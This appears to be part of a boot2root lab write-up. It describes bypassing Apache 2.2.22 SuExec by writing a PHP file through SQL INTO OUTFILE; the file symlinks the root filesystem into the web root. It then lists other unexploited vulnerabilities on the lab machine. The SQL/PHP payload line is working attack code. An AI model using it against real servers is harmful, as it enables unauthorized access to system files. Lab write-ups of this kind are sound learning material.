# Apache 2.2.22 SuExec exploit

SuExec is enabled to run script as the caller uid and not www-data uid
However due to a missconfigured .htaccess that follow symlink we can bypass the SuExec feature and run a program as www-data
So we just need to symlink the apache2 filesystem with php code (here rootsymlink)
And we trigger the php code by uploading it and requesting it just like we did on our method1

SELECT '<?php system("ln -sf / rootsymlink.php"); symlink("/", "rootsymlink.php"); ?>'
INTO OUTFILE "/var/www/forum/templates_c/apache_vuln.php"

And Ta-Dam! We can see the whole filesystem as www-data, new entrypoint :D
(It looks/is pretty easy to exploit now that it's done but somehow it took me ages to understand that..)

Ressource :
- https://www.exploit-db.com/exploits/27397

### Goodbye boot2root, additional vulnerability that wont be exploited for now

It is as far as i'll go on this box since my time isnt infinite, but overall this project made me learn a ton even if it was boring at first
I still am sure about at least 5 other possiblity to exploit the machine, the 2 most important one being:
- We see with our linPeas log that we have a vulnerable sudo version that we can format_string through sudoedit without config im able to crash it but it would require a lot of effort to develop an exploit for it (even more so since its in a patched library version)
- Heartbleed !! Very interesting, somehow my metasploit module just wont follow but it was interesting to learn about, as it is in my eyes one of the most important ssl vuln

Then we also have our vulnerable gcc and other binary version, and the squirrelmail CVE-2017-7692 is also probably exploitable with enough skill and time
Ressource : https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html
